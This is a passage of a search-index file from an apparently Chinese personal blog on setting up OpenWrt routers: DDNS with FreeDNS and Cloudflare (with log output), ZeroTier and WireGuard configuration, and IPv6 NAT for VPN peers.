system\n</code></pre>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u7b2c\u4e09\u65b9\u8f6f\u4ef6","title":"\u7b2c\u4e09\u65b9\u8f6f\u4ef6","text":"","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#ddns","title":"DDNS","text":"<pre><code>opkg install luci-app-ddns ddns-scripts-freedns\n</code></pre>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#freedns","title":"FreeDNS","text":"<p>FreeDNS\u662f\u4e00\u4e2a\u514d\u8d39\u63d0\u4f9b DDNS \u670d\u52a1\u7684\u7f51\u7ad9\uff0c\u4e0a\u9762\u6709\u8bb8\u591a\u4eba\u5206\u4eab\u4e86\u81ea\u5df1\u7684\u4e00\u7ea7\u57df\u540d\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u4e0a\u9762\u6ce8\u518c\u81ea\u5df1\u7684\u4e8c\u7ea7\u57df\u540d\u3002</p> <p>\u4ee5\u4e0b\u662f FreeDNS \u5404\u9875\u9762\u529f\u80fd\u7684\u4ecb\u7ecd</p> <ul> <li>Subdomains\u9875\u9762<ul> <li>\u7528\u4e8e\u6dfb\u52a0\u548c\u7ba1\u7406\u81ea\u5df1\u7684\u5b50\u57df\u540d<ul> <li>\u6dfb\u52a0\u65f6\u7c7b\u578b A \u8868\u793a\u5c06\u5b50\u57df\u540d\u6620\u5c04\u5230\u4e00\u4e2a ipv4 \u5730\u5740\u4e0a</li> <li>\u7c7b\u578b AAAA \u8868\u793a\u6620\u5c04\u5230 ipv6 \u5730\u5740\u4e0a</li> <li>CNAME \u8868\u793a\u6620\u5c04\u5230\u53e6\u4e00\u4e2a\u57df\u540d</li> </ul> </li> </ul> </li> <li>Dynamic DNS\u9875\u9762<ul> <li>\u5305\u542b\u5404\u79cd\u914d\u7f6e DDNS \u7684\u65b9\u5f0f\uff0c\u89c1\u4e0b\u8282</li> </ul> </li> <li>Registry\u9875\u9762<ul> <li>\u5305\u542b\u6240\u6709\u53ef\u9009\u57df\u540d</li> </ul> </li> </ul>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u914d\u7f6e","title":"\u914d\u7f6e","text":"<ul> <li>\u65b9\u5f0f\u4e00\uff1a\u4f7f\u7528 crontab \u811a\u672c\uff08\u6700\u7b80\u5355\uff09<ul> <li>ipv4   \u5728 FreeDNS Dynamic DNS\u9875\u9762\uff0c\u5728\u6bcf\u4e2a\u5b50\u57df\u540d\u5904\uff0c\u6709\u5bf9\u5e94\u7684 quick cron example\u3002\u5c06\u5176\u6dfb\u52a0\u5230 crontab \u4e2d\u5373\u53ef\u3002   \u6ce8\uff1a\u4f7f\u7528\u8fd9\u79cd\u65b9\u5f0f\u65e0\u6cd5\u66f4\u65b0 ipv6 \u5730\u5740\uff0c\u4f1a\u5c06 ipv4 \u5730\u5740\u66f4\u65b0\u7ed9\u57df\u540d</li> <li>ipv6   \u5728Get your update URLs (afraid.org)\u4e2d\u5f00\u542f Randomized Update Token   \u4f7f\u7528\u8fd9\u91cc\u7684 cron script\uff0c\u5176\u4e2d\u4f1a\u8bbf\u95ee v6.sync.afraid.org\uff0c\u53ef\u4ee5\u66f4\u65b0 ipv6</li> </ul> </li> <li> <p>\u65b9\u5f0f\u4e8c\uff1a\u4f7f\u7528 openwrt \u63d2\u4ef6</p> <ul> <li>openwrt \u63d2\u4ef6\u4e0b\u8f7d\uff1aluci-ddns-app</li> <li>DDNS Service provider \u9009\u62e9 afraid.org-keyauth\uff08\u4e5f\u53ef\u4f7f\u7528 afraid.orgv2-token\uff0c\u4f46\u662f\u4e0b\u4e00\u6b65\u4f7f\u7528\u7684\u7f16\u7801\u5219\u4f7f\u7528\u4e0a\u4e00\u79cd\u65b9\u5f0f\u4e2d\u5f00\u542f Randomized Update Token \u5904\u7684 token\uff09</li> <li> <p>password \u5904\u586b\u5199\u6bcf\u4e2a\u5b50\u57df\u540d\u5bf9\u5e94\u66f4\u65b0\u94fe\u63a5\u4e2d\u7684\u7f16\u7801\uff08\u5728 FreeDNS \u6bcf\u4e2a\u5b50\u57df\u540d\u7684 Direct URL \u4e2d\u53ef\u89c1\uff09   \u7c7b\u4f3c\u5982\u4e0b\u683c\u5f0f</p> <pre><code>https://freedns.afraid.org/dynamic/update.php?Zk9FOG55RxxxxxxxIwMTY3ODY0\n</code></pre> </li> </ul> <ul> <li>\u5176\u4f59 domain\uff0cusername \u90fd\u53ef\u4ee5\u968f\u4fbf\u586b</li> <li>\u5728 Advanced Setting \u4e2d\u9009\u62e9 netwrok</li> <li> <p>\u4fdd\u5b58\u5e94\u7528\u540e\uff0c\u70b9\u51fb reload\uff0c\u53ef\u4ee5\u5728 Log File Viewer \u4e2d\u67e5\u770b\u662f\u5426\u6210\u529f\u8fd0\u884c\u3002   \u53ef\u4ee5\u770b\u5230\u7b2c\u4e00\u6b21\u5b8c\u6210\u66f4\u65b0\uff0c\u7b2c\u4e8c\u6b21\u4e0d\u66f4\u65b0</p> <pre><code>212943       : Detect registered/public IP\n   212943       : #&gt; /usr/bin/nslookup rm.ipv6.my.to  &gt;/var/run/ddns/FreeDNS_ipv6.dat 2&gt;/var/run/ddns/FreeDNS_ipv6.err\n   212943       : Registered IP '2409:8a38:1600:7e42:9e9d:7e1f:cfc6:de30' detected\n   212943  info : Starting main loop at 2022-01-25 21:29\n   212943       : Detect local IP on 'network'\n   212943       : Local IP '2409:8a38:1600:2c2c:9e9d:7e58:c2c6:de30' detected on network 'wan_6'\n   212943       : Update needed - L: '2409:8a38:1600:2c2c:9e9d:7e58:c2c6:de30' &lt;&gt; R: '2409:8a38:1600:7e42:9e9d:7e1f:cfc6:de30'\n   212943       : Force communication via device 'pppoe-wan'\n   212943       : #&gt; /usr/bin/curl -RsS -o /var/run/ddns/FreeDNS_ipv6.dat --stderr /var/run/ddns/FreeDNS_ipv6.err --interface pppoe-wan --noproxy '*' 'https://freedns.afraid.org/dynamic/update.php?***PW***&amp;address=2409:8a38:1600:2c2c:9e9d:7e58:c2c6:de30'\n   212945       : DDNS Provider answered:\n  Updated 1 host(s) rm.ipv6.my.to to 2409:8a38:1600:2c2c:9e9d:7e58:c2c6:de30 in 0.335 seconds\n   212945  info : Update successful - IP '2409:8a38:1600:2c2c:9e9d:7e58:c2c6:de30' send\n   212945  info : Forced update successful - IP: '2409:8a38:1600:2c2c:9e9d:7e58:c2c6:de30' send\n   212945       : Waiting 600 seconds (Check Interval)\n\n\n   213945       : Detect registered/public IP\n   213945       : #&gt; /usr/bin/nslookup rm.ipv6.my.to  &gt;/var/run/ddns/FreeDNS_ipv6.dat 2&gt;/var/run/ddns/FreeDNS_ipv6.err\n   213947       : Registered IP '2409:8a38:1600:2c2c:9e9d:7e58:c2c6:de30' detected\n   213947  info : Rerun IP check at 2022-01-25 21:39\n   213947       : Detect local IP on 'network'\n   213947       : Local IP '2409:8a38:1600:2c2c:9e9d:7e58:c2c6:de30' detected on network 'wan_6'\n   213947       : Waiting 600 seconds (Check Interval)\n</code></pre> </li> </ul> </li> </ul>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#cloudflare","title":"Cloudflare","text":"<p>cf \u652f\u6301 global key \u548c token \u4e24\u79cd\u65b9\u5f0f\u9274\u6743\uff0ccloudflare.com-v4 \u65b9\u6cd5\u4f7f\u7528 token\uff0c\u63a8\u8350\u4f7f\u7528\u3002</p> <p>\u9ed8\u8ba4 ddns provider \u6ca1\u6709 cloudflare\uff0c\u9700\u8981\u5b89\u88c5\u63d2\u4ef6</p> <pre><code>opkg install ddns-scripts-cloudflare\n</code></pre> <p>\u6ce8\u610f\u70b9</p> <ul> <li>\u751f\u6210 token \u65f6\uff0c\u9700\u8981\u5f00\u542f\u4e24\u9879\u6743\u9650<ul> <li>Zone -&gt; Zone -&gt; Read</li> <li>Zone -&gt; DNS -&gt; Edit</li> </ul> </li> <li>\u914d\u7f6e openwrt ddns luci \u65f6<ul> <li>Lookup Hostname \u5bf9\u5e94\u8981\u66f4\u65b0\u7684\u57df\u540d\uff0cddns \u9996\u5148\u4f1a\u89e3\u6790\u8be5\u57df\u540d\u6765\u5224\u65ad\u662f\u5426\u9700\u8981\u66f4\u65b0</li> <li>domain \u6bd4\u8f83\u5947\u602a\uff0c\u662f\u4e00\u4e2a\u7ec4\u5408<code>subdomain@domain</code>\u3002\u811a\u672c\u901a\u8fc7<code>@</code>\u5206\u9694 domain \u5b57\u7b26\u4e32\uff0c\u5f97\u5230\u4e24\u4e2a\u5185\u5bb9<ul> <li>domain: \u5bf9\u5e94 cloudflare \u7684 Zone id</li> <li>subdomain.domain\uff1a\u5bf9\u5e94\u9700\u8981\u66f4\u65b0\u7684 record id</li> <li>\u6bd4\u5982\u5bf9\u4e8e<code>op1.6.yfycloud.site</code>\uff0c\u9700\u8981\u586b<code>op1.6@yfycloud.site</code></li> </ul> </li> <li>Username \u5fc5\u987b\u586bBearer</li> </ul> </li> <li>https \u5f00\u542f\u66f4\u5b89\u5168\uff1a<code>/etc/ssl/certs</code> </li> </ul> <p>\u6210\u529f\u65e5\u5fd7</p> <pre><code> 172255       : Current IP '114.214.236.72' detected on network 'wan'\n 172255       : Forced Update - L: '114.214.236.72' == R: '114.214.236.72'\n 172255       : parsing script '/usr/lib/ddns/update_cloudflare_com_v4.sh'\n 172255       : Found Username 'Bearer' using Password as Bearer Authorization Token\n 172255       : #&gt; /usr/bin/curl -RsS -o /var/run/ddns/Cloudflare.dat --stderr /var/run/ddns/Cloudflare.err --capath /etc/ssl/certs --noproxy '*' --header 'Authorization: Bearer ***PW***'  --header 'Content-Type: application/json'  --request GET 'https://api.cloudflare.com/client/v4/zones?name=yfycloud.site'\n 172256       : #&gt; /usr/bin/curl -RsS -o /var/run/ddns/Cloudflare.dat --stderr /var/run/ddns/Cloudflare.err --capath /etc/ssl/certs --noproxy '*' --header 'Authorization: Bearer ***PW***'  --header 'Content-Type: application/json'  --request GET 'https://api.cloudflare.com/client/v4/zones/9de934462ae45ebf6d363d953b0ea5ef/dns_records?name=yfycloud.site&amp;type=A'\n 172257       : IPv4 at CloudFlare.com already up to date\n 172257  info : Forced update successful - IP: '114.214.236.72' send\n 172257       : Waiting 600 seconds (Check Interval)\n</code></pre>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#ipv6","title":"ipv6","text":"<p>\u521a\u5f00\u662f\u7531\u4e8e\u4e0d\u6e05\u695a domain \u7684\u542b\u4e49\uff0c\u5bfc\u81f4\u5404\u79cd\u62a5\u9519</p> <pre><code>'https://api.cloudflare.com/client/v4/zones/9de934462ae45ebf6d363d953b0ea5ef/dns_records?name=yfycloud.site&amp;type=AAAA'\n 173821  WARN : Could not detect 'record id' for host.domain.tld: 'yfycloud.site'\n</code></pre> <pre><code> 174031       : #&gt; /usr/bin/curl -RsS -o /var/run/ddns/CloudflareIPv6.dat --stderr /var/run/ddns/CloudflareIPv6.err --noproxy '*' --header 'Authorization: Bearer ***PW***'  --header 'Content-Type: application/json'  --request GET 'https://api.cloudflare.com/client/v4/zones?name=op1.6.yfycloud.site'\n 174032  WARN : Could not detect 'zone id' for domain.tld: 'op1.6.yfycloud.site'\n 174032 ERROR : No update send to DDNS Provider\n</code></pre> <p>\u6210\u529f\u65e5\u5fd7</p> <pre><code>174709       : Detect current IP on 'network'\n 174709       : Current IP '2001:da8:xxxx' detected on network 'wan6'\n 174709       : Update needed - L: '2001:0da8:xxxx' &lt;&gt; R: '2001:0da8:d800:0336:0216:3eff:fee2:4e72'\n 174709       : parsing script '/usr/lib/ddns/update_cloudflare_com_v4.sh'\n 174709       : Found Username 'Bearer' using Password as Bearer Authorization Token\n 174709       : #&gt; /usr/bin/curl -RsS -o /var/run/ddns/CloudflareIPv6.dat --stderr /var/run/ddns/CloudflareIPv6.err --capath /etc/ssl/certs --noproxy '*' --header 'Authorization: Bearer ***PW***'  --header 'Content-Type: application/json'  --request GET 'https://api.cloudflare.com/client/v4/zones?name=yfycloud.site'\n 174710       : #&gt; /usr/bin/curl -RsS -o /var/run/ddns/CloudflareIPv6.dat --stderr /var/run/ddns/CloudflareIPv6.err --capath /etc/ssl/certs --noproxy '*' --header 'Authorization: Bearer ***PW***'  --header 'Content-Type: application/json'  --request GET 'https://api.cloudflare.com/client/v4/zones/9de934462ae45ebf6d363d953b0ea5ef/dns_records?name=op1.6.yfycloud.site&amp;type=AAAA'\n 174710       : #&gt; /usr/bin/curl -RsS -o /var/run/ddns/CloudflareIPv6.dat --stderr /var/run/ddns/CloudflareIPv6.err --capath /etc/ssl/certs --noproxy '*' --header 'Authorization: Bearer ***PW***'  --header 'Content-Type: application/json'  --request PUT --data @/var/run/ddns/CloudflareIPv6.dat 'https://api.cloudflare.com/client/v4/zones/9de934462ae45ebf6d363d953b0ea5ef/dns_records/7e4d07109629151a0b776bd7ffc76a0e'\n 174711  info : Update successful - IP '2001:0da8:xxxx' send\n 174711  info : Forced update successful - IP: '2001:0da8:xxxx' send\n</code></pre> <p>\u53c2\u8003\uff1a</p> <ul> <li>Solved Cloudflare dyndns - Installing and Using OpenWrt - OpenWrt Forum</li> <li>Trying Cloudflare DDNS on 21.02 - Installing and Using OpenWrt - OpenWrt Forum</li> </ul>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#zerotier","title":"ZeroTier","text":"","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u4f5c\u7528","title":"\u4f5c\u7528","text":"<ol> <li>\u5c06\u82e5\u5e72\u4e2a\u5b89\u88c5\u4e86 Zerotier \u7684\u8bbe\u5907\u6dfb\u52a0\u5230\u4e00\u4e2a\u865a\u62df\u7684\u5927\u5c40\u57df\u7f51\u4e2d\u4e92\u76f8\u8bbf\u95ee</li> <li>\u53ef\u4ee5\u5728 Zerotier \u4e2d\u8bbe\u7f6e Route\uff0c\u4ece\u800c\u5b9e\u73b0\u8bbf\u95ee\u67d0\u4e2a zerotier \u8bbe\u5907\u6240\u5904\u5c40\u57df\u7f51\u4e2d\u7684\u5176\u5b83\u8bbe\u5907</li> </ol>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u5177\u4f53\u8fc7\u7a0b","title":"\u5177\u4f53\u8fc7\u7a0b","text":"<ol> <li> <p>\u53bb ZeroTier \u6ce8\u518c\u4e00\u4e2a\u8d26\u53f7\uff0c\u5e76\u4e86\u89e3 ZeroTier \u7684\u4f7f\u7528</p> </li> <li> <p>\u5b89\u88c5 zerotier</p> <pre><code>opkg update\nopkg install zerotier\n</code></pre> <p>\u8fd9\u91cc\u4f1a\u4f9d\u8d56 kmod-tun \u7b49\u5185\u6838\u6a21\u5757\uff0c\u8fd9\u8981\u6c42\u5185\u6838\u7248\u672c\u5b8c\u5168\u4e00\u81f4\u624d\u80fd\u5b89\u88c5\u6210\u529f\u3002</p> <ul> <li>\u5982\u679c\u4f7f\u7528\u7684\u662f openwrt \u5f00\u53d1\u7248\u672c (snapshot)\uff1a\u7531\u4e8e snapshot \u6bcf\u5929\u3001\u751a\u81f3\u51e0\u4e2a\u5c0f\u65f6\u5c31\u4f1a\u66f4\u65b0\uff0c\u56e0\u6b64\u5f88\u6709\u53ef\u80fd\u56e0\u4e3a\u6709\u4e86\u65b0\u7684\u66f4\u65b0\uff0c\u5bfc\u81f4 opkg \u4e0b\u8f7d\u7684 kmod-tun \u5185\u6838\u7248\u672c\u4e0d\u4e00\u81f4\u5bfc\u81f4\u62a5\u9519\u3002\u89e3\u51b3\u529e\u6cd5\u4e3a\u66f4\u65b0\u4e3a\u65b0\u7248\u7684\u5f00\u53d1\u7248\uff0c\u5e76\u5c3d\u5feb\u4e0b\u8f7d\u5b89\u88c5\u3002\u6216\u8005\u81ea\u5df1\u7f16\u8bd1 openwrt\u3002</li> <li>\u5bf9\u4e8e stable \u7248\u672c\uff0c\u5b98\u65b9\u6e90\u4fdd\u8bc1\u4e86\u4e00\u81f4\u6027\uff0c\u56e0\u6b64\u8fd9\u91cc\u4e0d\u4f1a\u51fa\u73b0\u95ee\u9898\u3002</li> </ul> </li> <li> <p>\u914d\u7f6e ZeroTier</p> </li> </ol> <ul> <li>\u521b\u5efa\u76ee\u5f55\uff1amkdir -p /etc/zerotier</li> <li> <p>\u4fee\u6539/etc/config/zerotier \u5185\u5bb9\uff08\u5b58\u5728\u6837\u672c\u914d\u7f6e\uff09\uff0c\u4e0b\u9762\u4ee3\u7801\u4e3a\u4f7f\u7528\u547d\u4ee4\u884c\u914d\u7f6e\u65b9\u6cd5</p> <pre><code>uci set zerotier.openwrt_network=zerotier\nuci add_list zerotier.openwrt_network.join='\u4f60\u7684\u7f51\u7edc ID'\nuci set zerotier.openwrt_network.enabled='1'\nuci set zerotier.openwrt_network.config_path='/etc/zerotier'\nuci commit zerotier\n</code></pre> </li> </ul> <ol> <li> <p>\u542f\u52a8 zerotier\uff08\u8fd9\u6b65\u4e4b\u540e\u5df2\u7ecf\u53ef\u4ee5\u4ece ZeroTier Central \u4e2d\u770b\u5230\u8def\u7531\u5668\u8fde\u4e0a\u4e86\uff09</p> <pre><code>/etc/init.d/zerotier enable\n/etc/init.d/zerotier start\n</code></pre> </li> <li> <p>\u521b\u5efa\u63a5\u53e3\uff08\u8fd9\u6b65\u4e4b\u540e\u5df2\u7ecf\u53ef\u4ee5 ping \u901a\uff09</p> <ul> <li>web \u754c\u9762\uff0c\u7f51\u7edc -&gt; \u63a5\u53e3\uff0c\u6dfb\u52a0\u65b0\u63a5\u53e3</li> <li>\u540d\u79f0 ZeroTier</li> <li>\u534f\u8bae\u9009\u9759\u6001\u534f\u8bae\uff0cip \u8bbe\u7f6e\u4e3a ZeroTier Central \u4e2d\u7684 ip</li> <li>\u63a5\u53e3\u9009 z \u5f00\u5934\u7684\u9002\u914d\u5668</li> <li>\u521b\u5efa/\u5206\u914d\u9632\u706b\u5899\u533a\u57df\u9009\u62e9 lan\uff08\u5176\u5b9e lan/wan \u90fd\u53ef\u4ee5\uff09</li> <li>\u4fdd\u5b58&amp;\u5e94\u7528</li> </ul> </li> </ol> <pre><code>ZEROTIER_MASK=255.255.255.0\nZEROTIER_IP=192.168.196.11\n\nuci set network.Zerotier=interface\nuci set network.Zerotier.proto='static'\nuci set network.Zerotier.device='ztyou4dlov'\nuci set network.Zerotier.netmask=$ZEROTIER_MASK\nuci set network.Zerotier.ipaddr=$ZEROTIER_IP\nuci commit network\n\nuci add_list firewall.@zone[0].network='Zerotier' \u00a0 # add Zerotier to lan\nuci commit firewall\n</code></pre> <ol> <li> <p>\u9632\u706b\u5899</p> <p>\u5168\u90e8\u8bbe\u7f6e\u6210 allow</p> <p></p> </li> <li> <p>ZeroTier Central \u914d\u7f6e\u8def\u7531\u8f6c\u53d1</p> <p>\u914d\u7f6e\u8fd9\u4e2a\u540e\uff0c\u5728\u5916\u7f51\u53ef\u4ee5\u901a\u8fc7\u5c40\u57df\u7f51 ip \u76f4\u63a5\u8bbf\u95ee\u4e0d\u5728 ZeroTier Central \u4e2d\u7684\u5176\u5b83\u5c40\u57df\u7f51\u8bbe\u5907\u3002\uff08\u8fc7\u7a0b\u5927\u81f4\u662f\uff1a\u5916\u7f51 -&gt; zerotier -&gt; \u5c40\u57df\u7f51\u4e00\u53f0\u8bbe\u5907 (\u4f4d\u4e8e ZeroTier \u4e2d) -&gt; \u5c40\u57df\u7f51\u5176\u5b83\u8bbe\u5907\uff09</p> <p>\u914d\u7f6e\u56fe\uff1a\u8bbf\u95ee 192.168.31.*\u4e2d\u7684\u8bbe\u5907\u65f6\uff0c\u4f1a\u901a\u8fc7 192.168.192.168(\u5b9e\u9645\u5c40\u57df\u7f51 ip \u4e3a\u8def\u7531\u5668) \u8bbf\u95ee</p> <p></p> <p>\u6ce8\u610f\uff1a\u522b\u5c06\u7b2c\u4e00\u884c\u7684\u5220\u4e86\uff0c\u5426\u5219\u5168\u90e8\u65e0\u6cd5\u8bbf\u95ee</p> <p>\u7f3a\u70b9\uff1a\u76ee\u524d\u53d1\u73b0\uff0c\u5f53\u4e24\u53f0\u7535\u8111\u4f4d\u4e8e\u540c\u4e00\u4e2a\u5c40\u57df\u7f51\uff0c\u60f3\u8981\u76f4\u63a5\u901a\u8fc7\u5c40\u57df\u7f51 ip \u8bbf\u95ee\u65f6\uff0c\u5373\u4f7f\u6ca1\u6709\u5f00\u542f zerotier \u8f6f\u4ef6\uff0c\u4e24\u53f0\u7535\u8111\u7684\u76f8\u4e92\u8bbf\u95ee\u901f\u5ea6\u4e5f\u4f1a\u4e25\u91cd\u53d7\u9650\uff08\u539f\u672c\u53ef\u4ee5\u8dd1\u5230 500M\uff0c\u76f4\u63a5\u964d\u4e3a 10M\uff09</p> </li> </ol>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u9047\u5230\u7684\u95ee\u9898","title":"\u9047\u5230\u7684\u95ee\u9898","text":"<pre><code>root@tr3000:~# uci show zerotier\nuci: Entry not found\n\nroot@tr3000:~# zerotier-cli show\nzerotier-cli: missing port and zerotier-one.port not found in /var/lib/zerotier-one\n</code></pre> <pre><code>root@xdr6088 \u279c  ~ opkg files zerotier\nPackage zerotier (1.14.1-1) is installed on root and has the following files:\n/usr/bin/zerotier-idtool\n/etc/uci-defaults/80-zt-migration\n/etc/init.d/zerotier\n/usr/bin/zerotier-one\n/etc/config/zerotier\n/usr/bin/zerotier-cli\n</code></pre> <p>\u660e\u663e\u5c11\u4e86\u4e1c\u897f <pre><code>root@tr3000:~# opkg files zerotier\nPackage zerotier (1.14.1-r1) is installed on root and has the following files:\n/usr/bin/zerotier-idtool\n/usr/bin/zerotier-one\n/usr/bin/zerotier-cli\n</code></pre></p> <p>\u4e4b\u540e\u66f4\u65b0 tr3000 \u7b97\u4e86</p>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#wireguard","title":"Wireguard","text":"<ul> <li>\u5b98\u65b9\u6559\u7a0b\uff1a[OpenWrt Wiki] WireGuard server</li> </ul>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u5b89\u88c5","title":"\u5b89\u88c5","text":"<ul> <li> <p>\u5b89\u88c5wireguard   wiregurad\u662f\u5185\u6838\u6a21\u5757\uff0c\u5982\u679c\u662f\u81ea\u5df1\u7f16\u8bd1\u7684openwrt\u5219\u65e0\u6cd5\u901a\u8fc7opkg\u5b89\u88c5(linux kernel hash\u6821\u9a8c\u5931\u8d25\u5bfc\u81f4\u4f9d\u8d56\u4e0d\u6ee1\u8db3\uff09\uff0c\u9700\u8981\u5728\u7f16\u8bd1\u65f6\u96c6\u6210\u5230openwrt\u4e2d\u3002\u6216\u8005\u624b\u52a8\u5b89\u88c5</p> <pre><code>opkg update\nopkg install luci-app-wireguard\n</code></pre> </li> </ul>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u914d\u7f6e_1","title":"\u914d\u7f6e","text":"<p>\u65b0\u624b\u4f7f\u7528luci\u914d\u7f6e\uff0c\u4e4b\u540e\u76f4\u63a5\u590d\u5236\u5230/etc/config/network\u4e2d\u5373\u53ef</p> <ul> <li>\u521b\u5efa\u63a5\u53e3<ul> <li>web\u754c\u9762\uff0c\u7f51\u7edc -&gt; \u63a5\u53e3\uff0c\u6dfb\u52a0\u65b0\u63a5\u53e3</li> <li>\u540d\u79f0wireguard</li> <li>\u534f\u8bae\u9009wiregurad VPN</li> <li>\u751f\u6210\u79c1\u94a5</li> <li>\u8bbe\u7f6eip\u5730\u5740\u4e3a\u865a\u62df\u5c40\u57df\u7f51\u5730\u5740\uff0c\u598210.0.31.10/24</li> <li>\u4fdd\u5b58&amp;\u5e94\u7528</li> </ul> </li> </ul> <ul> <li>\u6dfb\u52a0peer<ul> <li>\u5728Luci\u4e2d\u624b\u52a8\u6dfb\u52a0</li> <li> <p>\u6216\u8005\u7f16\u8f91<code>/etc/config/network</code>\uff0c\u6dfb\u52a0\u5df2\u6709\u7684\u8bbe\u5907\uff0c\u5982</p> <pre><code>config wireguard_wireguard\n option public_key 'anjf3DtB6EkSo88uBXk8zFMLAZ3W2gD7AmXjqRl2mgM='\n list allowed_ips '10.0.31.2/32'\n option route_allowed_ips '1'\n option description 'ryzen5800X'\n</code></pre> </li> </ul> </li> </ul> <ul> <li> <p>\u4f7f\u5176\u751f\u6548\u65b9\u5f0f\uff1a</p> <ul> <li>\u91cd\u542f\u8def\u7531\u5668</li> <li>\u91cd\u542f\u7f51\u7edc\u63a5\u53e3</li> <li>\u547d\u4ee4\u884c\u91cd\u542f\u7f51\u7edc\u63a5\u53e3</li> </ul> <pre><code>ifconfig wg_s2s down &amp;&amp; ifup wg_s2s\n</code></pre> </li> </ul>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#ipv6_1","title":"ipv6","text":"<p>op\u6709ipv6\u7f51\u7edc\u73af\u5883\uff0c\u5982\u4f55\u8ba9wg\u63a5\u5165\u7684\u8bbe\u5907\u4e5f\u80fd\u62e5\u6709ipv6\u73af\u5883\uff1f</p> <p>\u53ef\u4ee5\u7ed9op\u548cpeer\u8bbe\u7f6eULA\u7684ipv6\u5730\u5740\uff0cpeer\u7684ipv6\u5305\u5230\u8fbeop\u540e\uff0c\u9700\u8981\u4eceop\u7684\u7f51\u7edc\u63a5\u53e3\u51fa\u53bb\uff08\u6bd4\u5982wan\uff09\u3002\u4f46\u662fwan\u7684masq\u9ed8\u8ba4\u662f\u4e0d\u5bf9ipv6\u6d41\u91cf\u8fdb\u884csrc nat\u7684\u3002\u8fd9\u91cc\u6211\u4eec\u60f3\u8981\u505a\u5230\uff1a</p> <ul> <li>\u4ecewg\u63a5\u53e3\u8fdb\u5165op\u7684\u6d41\u91cf\uff0c\u4ecewan\u51fa\u53bb\u65f6\uff0c\u5bf9ipv6\u7684\u6e90\u5730\u5740\uff08ULA\u5730\u5740\uff09\u8fdb\u884cnat</li> <li>\u5176\u5b83ipv6\u6d41\u91cf\uff08\u6e90\u5730\u5740\u4e3a\u5206\u914d\u7684\u516c\u7f51ipv6\u5730\u5740\uff09\u4ecewan\u51fa\u53bb\u65f6\uff0c\u4e0d\u8fdb\u884cnat</li> </ul> <ol> <li>\u4f9d\u8d56\uff0c\u5bf9\u4e8e22.03\u4ee5\u540e\u7684\u7248\u672c\uff0c\u5b9e\u6d4b\u4e0d\u9700\u8981\u5b89\u88c5\u5176\u5b83\u5185\u6838\u6a21\u5757\u3002\u5b98\u65b9\u6587\u6863\u5199\u5bf9\u4e8eopenwrt21.02 \uff0c\u9700\u8981\u5b89\u88c5nat\u6a21\u5757</li> </ol> <pre><code>opkg install kmod-ipt-nat6\n</code></pre> <ol> <li>wg\u63a5\u53e3\u8bbe\u7f6eipv6\u5730\u5740\u3002\u4eceULA\u5730\u5740\u6bb5\u9009\u53d6\u4e00\u4e2a\uff1aUnique local address - Wikipedia\uff0c\u5982\u56fe\u6240\u793a\u3002  \u6211\u9009\u62e9\u4e86\u4e00\u4e2a48\u7684\u7f51\u6bb5</li> </ol> <pre><code>fdab:2333:2333::2/48\n</code></pre> <ol> 